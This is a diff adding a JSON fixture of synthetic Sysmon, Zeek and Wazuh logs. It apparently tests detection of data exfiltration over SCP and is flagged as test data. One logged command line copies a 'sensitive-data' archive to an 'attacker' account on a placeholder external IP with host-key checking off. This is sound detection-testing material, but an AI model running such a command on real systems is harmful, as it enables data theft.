@@ -1,0 +1,200 @@
+{
+  "metadata": {
+    "technique_id": "T1048.011",
+    "technique_name": "Exfiltration Over Alternative Protocol: SCP/SFTP",
+    "tactic": "exfiltration",
+    "description": "Exfiltrate data via SCP to external SSH server",
+    "campaign": "34",
+    "batch": "15",
+    "expected_detection": "MEDIUM",
+    "attack_time": "2026-02-10T15:26:00.000Z",
+    "target_host": "VULN01",
+    "simulated_destination": "198.51.100.99"
+  },
+  "logs": [
+    {
+      "timestamp": "2026-02-10T15:26:00.000Z",
+      "rule": {
+        "level": 3,
+        "description": "Sysmon - Event 1: Process Creation",
+        "id": "100101",
+        "mitre": {
+          "id": [
+            "T1048.011"
+          ],
+          "tactic": [
+            "Exfiltration"
+          ],
+          "technique": [
+            "Exfiltration Over Alternative Protocol"
+          ]
+        },
+        "groups": [
+          "sysmon",
+          "sysmon_event1"
+        ]
+      },
+      "agent": {
+        "id": "030",
+        "name": "VULN01",
+        "ip": "198.51.100.30"
+      },
+      "manager": {
+        "name": "wazuh.manager"
+      },
+      "id": "1707576360.000001",
+      "decoder": {
+        "name": "sysmon"
+      },
+      "location": "/var/log/sysmon/sysmon.log",
+      "data": {
+        "eventdata": {
+          "utcTime": "2026-02-10 15:26:00.000",
+          "processGuid": "{b34e471d-0123-66d9-0000-0011f4bc4000}",
+          "processId": "9234",
+          "image": "/usr/bin/scp",
+          "fileVersion": "-",
+          "description": "-",
+          "product": "-",
+          "company": "-",
+          "originalFileName": "-",
+          "commandLine": "scp -o StrictHostKeyChecking=no /tmp/sensitive-data.tar.gz attacker@198.51.100.99:/data/",
+          "currentDirectory": "/home/admin2",
+          "user": "admin2",
+          "logonGuid": "{b34e471d-1234-66d9-0000-0020ab123400}",
+          "logonId": "1004",
+          "terminalSessionId": "2",
+          "integrityLevel": "no_level",
+          "hashes": "SHA256=F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1",
+          "parentProcessGuid": "{b34e471d-0123-66d9-0000-0011f4bc3f00}",
+          "parentProcessId": "9201",
+          "parentImage": "/bin/bash",
+          "parentCommandLine": "-bash",
+          "parentUser": "admin2"
+        }
+      },
+      "fomorian_test": true,
+      "fomorian_batch": "15",
+      "fomorian_campaign": "34"
+    },
+    {
+      "timestamp": "2026-02-10T15:26:05.000Z",
+      "rule": {
+        "level": 3,
+        "description": "Sysmon - Event 3: Network Connection",
+        "id": "100103",
+        "mitre": {
+          "id": [
+            "T1048.011"
+          ],
+          "tactic": [
+            "Exfiltration"
+          ],
+          "technique": [
+            "Exfiltration Over Alternative Protocol"
+          ]
+        },
+        "groups": [
+          "sysmon",
+          "sysmon_event3"
+        ]
+      },
+      "agent": {
+        "id": "030",
+        "name": "VULN01",
+        "ip": "198.51.100.30"
+      },
+      "manager": {
+        "name": "wazuh.manager"
+      },
+      "id": "1707576365.000002",
+      "decoder": {
+        "name": "sysmon"
+      },
+      "location": "/var/log/sysmon/sysmon.log",
+      "data": {
+        "eventdata": {
+          "utcTime": "2026-02-10 15:26:05.000",
+          "processGuid": "{b34e471d-0123-66d9-0000-0011f4bc4001}",
+          "processId": "9245",
+          "image": "/usr/bin/ssh",
+          "user": "admin2",
+          "protocol": "tcp",
+          "initiated": "true",
+          "sourceIsIpv6": "false",
+          "sourceIp": "198.51.100.30",
+          "sourcePort": "45901",
+          "destinationIsIpv6": "false",
+          "destinationIp": "198.51.100.99",
+          "destinationPort": "22"
+        }
+      },
+      "fomorian_test": true,
+      "fomorian_batch": "15",
+      "fomorian_campaign": "34"
+    },
+    {
+      "timestamp": "2026-02-10T15:26:10.000Z",
+      "rule": {
+        "level": 5,
+        "description": "Zeek - SSH session to external IP",
+        "id": "100001",
+        "mitre": {
+          "id": [
+            "T1048.011"
+          ],
+          "tactic": [
+            "Exfiltration"
+          ],
+          "technique": [
+            "Exfiltration Over Alternative Protocol"
+          ]
+        },
+        "groups": [
+          "zeek",
+          "zeek_ssh"
+        ]
+      },
+      "agent": {
+        "id": "001",
+        "name": "GW01",
+        "ip": "198.51.100.1"
+      },
+      "manager": {
+        "name": "wazuh.manager"
+      },
+      "id": "1707576370.000003",
+      "decoder": {
+        "name": "zeek"
+      },
+      "location": "/var/log/zeek/ssh.log",
+      "data": {
+        "zeek": {
+          "ssh": {
+            "ts": "1707576370.000000",
+            "uid": "NKlDwx4AbCcGeFgh8f",
+            "id.orig_h": "198.51.100.30",
+            "id.orig_p": "45901",
+            "id.resp_h": "198.51.100.99",
+            "id.resp_p": "22",
+            "version": "2",
+            "auth_success": "true",
+            "auth_attempts": "1",
+            "direction": "OUTBOUND",
+            "client": "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1",
+            "server": "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1",
+            "cipher_alg": "chacha20-poly1305@openssh.com",
+            "mac_alg": "umac-128-etm@openssh.com",
+            "compression_alg": "none",
+            "kex_alg": "curve25519-sha256",
+            "host_key_alg": "ssh-ed25519",
+            "host_key": "SHA256:Ab12Cd34Ef56Gh78Ij90Kl12Mn34Op56Qr78St90Uv12Wx34Yz56"
+          }
+        }
+      },
+      "fomorian_test": true,
+      "fomorian_batch": "15",
+      "fomorian_campaign": "34"
+    }
+  ]
+}
